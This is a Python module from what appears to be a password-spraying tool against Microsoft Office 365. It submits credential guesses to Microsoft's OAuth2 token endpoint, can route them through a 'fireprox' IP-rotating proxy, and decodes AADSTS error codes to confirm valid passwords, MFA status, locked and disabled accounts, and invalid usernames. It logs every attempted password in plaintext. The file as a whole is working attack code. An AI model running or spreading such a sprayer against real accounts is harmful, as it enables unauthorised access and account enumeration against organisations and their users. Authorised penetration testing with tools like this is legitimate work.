import json
import datetime
import requests


class Office365:
    NAME = "Office365"
    DESCRIPTION = "Spray Microsoft Office 365"

    def __init__(self, host, port, timeout, fireprox):

        self.timeout = timeout
        self.url = "https://login.microsoft.com/common/oauth2/token"

        if fireprox:
            self.url = f"https://{fireprox}/fireprox/common/oauth2/token"

        self.headers = {
            "Accept": "application/json",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0",
            "Expect": "100-continue",
            "Connection": "close",
        }

        self.data = {
            "resource": "https://graph.windows.net",
            "client_id": "1b730954-1685-4b74-9bfd-dac224a7b894",
            "client_info": "1",
            "grant_type": "password",
            "username": "",
            "password": "",
            "scope": "openid",
        }

    def set_username(self, username):
        self.data["username"] = username

    def set_password(self, password):
        self.data["password"] = password

    def login(self, username, password):
        # set data
        self.set_username(username)
        self.set_password(password)
        # post the request
        response = requests.post(
            self.url, headers=self.headers, data=self.data, timeout=self.timeout
        )  # , verify=False, proxies=self.proxyDict)
        return response

    #
    # Print table headers
    #
    def print_headers(self):
        # print table headers
        print(
            "%-13s %-30s %-35s %-17s %-13s %-15s"
            % (
                "Result",
                "Message",
                "Username",
                "Password",
                "Response Code",
                "Response Length",
            )
        )
        print("-" * 128)


    #
    # Print individual login attempt result
    #
    def print_response(self, response, outfile, timeout=False):
        if timeout:
            code = "TIMEOUT"
            length = "TIMEOUT"
        else:
            code = response.status_code
            length = str(len(response.content))

        if response.status_code == 200:
            result = "Success"
            message = "Valid login; no MFA"
        else:
            data = json.loads(response.content)
            err = data["error_description"].split(":")[0]

            # Thanks to dafthack for figuring out the error codes: https://github.com/dafthack/MSOLSpray
            # standard error code
            if err == "AADSTS50126":
                result = "Fail"
                message = ""

            # Microsoft's MFA in use
            elif err == "AADSTS50076":
                result = "Success"
                message = "Microsoft MFA in use"

            # Microsoft's MFA must be onboarded
            elif err == "AADSTS50079":
                result = "Success"
                message = "Microsoft MFA must be onboarded"

            # DUO or other MFA in use
            elif err == "AADSTS50158":
                result = "Success"
                message = "Non-Microsoft MFA in use"

            # user password expired
            elif err == "AADSTS50055":
                result = "Success"
                message = "User's password is expired"

            elif err == "AADSTS50034":
                result = "Fail"
                message = "Invalid username"

            # tenant does not exist. Is domain using Office365?
            elif err in ["AADSTS50128", "AADSTS50059"]:
                result = "Fail"
                message = "Tenant account does not exist"

            # locked account
            elif err == "AADSTS50053":
                result = "Fail"
                message = "Account apppears locked"

            # account disabled
            elif err == "AADSTS50057":
                result = "Fail"
                message = "Account appears disabled"

            # all other codes
            else:
                result = "Fail"
                message = "Unknown error code returned"

        # print result to screen
        print(
            "%-13s %-30s %-35s %-17s %13s %15s"
            % (
                result,
                message,
                self.data["username"],
                self.data["password"],
                code,
                length,
            )
        )

        # log attempt to JSON
        self.log_attempt(result, message, code, length, outfile)


    #
    # Log attempt as JSON object to file
    #
    def log_attempt(self, result, message, code, length, outfile):
        output = open(outfile, "a")
        output.write(
            json.dumps(
                {
                    "UTC Timestamp": datetime.datetime.now(datetime.UTC).strftime("%Y-%m-%d %H:%M:%S"),
                    "Module": self.__class__.__name__,
                    "Result": result,
                    "Message": message,
                    "Username": self.data["username"],
                    "Password": self.data["password"],
                    "Response Code": code,
                    "Response Length": length,
                }
            )
        )
        output.write("\n")
        output.close()